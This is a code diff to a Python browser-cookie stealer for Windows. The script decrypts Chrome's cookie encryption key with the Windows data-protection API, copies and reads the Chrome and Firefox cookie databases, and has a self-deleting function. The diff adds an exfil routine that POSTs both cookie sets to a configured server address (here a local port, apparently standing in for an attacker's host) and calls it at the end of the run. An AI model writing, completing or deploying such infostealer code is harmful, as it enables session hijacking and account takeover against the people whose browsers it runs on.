@@ -1,4 +1,5 @@
 from Crypto.Cipher import AES
+import requests
 import win32crypt
 import sqlite3
 import base64
@@ -7,7 +8,7 @@ import os
 import shutil
 
 
-home = ""
+home = "http://127.0.0.1:9001/"
 
 c_bin = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
 f_bin = r"C:\Program Files\Mozilla Firefox\firefox.exe"
@@ -24,7 +25,6 @@ f_path = os.path.join(
 
 has_c = False
 has_f = False
-
 
 def check_for_browsers(c_bin, f_bin):
     global has_c, has_f, has_e
@@ -44,9 +44,9 @@ def c_get_key():
                 localStateData = json.load(file)
                 encryptedKey = localStateData["os_crypt"]["encrypted_key"]
                 keyData = base64.b64decode(encryptedKey.encode("utf-8"))
-                return win32crypt.CryptUnprotectData(keyData[5:], None, None, None, 0)[
-                    1
-                ]
+                return win32crypt.CryptUnprotectData(
+                    keyData[5:], None, None, None, 0
+                )[1]
         except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
             print(e)
             return None
@@ -56,9 +56,9 @@ def c_get_cookies():
     key = c_get_key()
     if not key:
         return []
-
+    
     c_tempCookiesPath = os.path.join(os.environ["TEMP"], "c_tempcookies.db")
-
+    
     shutil.copy(c_cookiespath, c_tempCookiesPath)
 
     conn = sqlite3.connect(c_tempCookiesPath)
@@ -110,6 +110,9 @@ def f_get_cookies(f_path):
 
     return f_cookies
 
+def exfil():
+    requests.post(home, json=c_cookies)
+    requests.post(home, json=f_cookies)
 
 def killself():
     current_path = os.path.abspath(__file__)
@@ -121,6 +124,8 @@ if __name__ == "__main__":
 
     if has_c:
         c_cookies = c_get_cookies()
-
+    
     if has_f:
         f_cookies = f_get_cookies(f_path)
+
+    exfil()
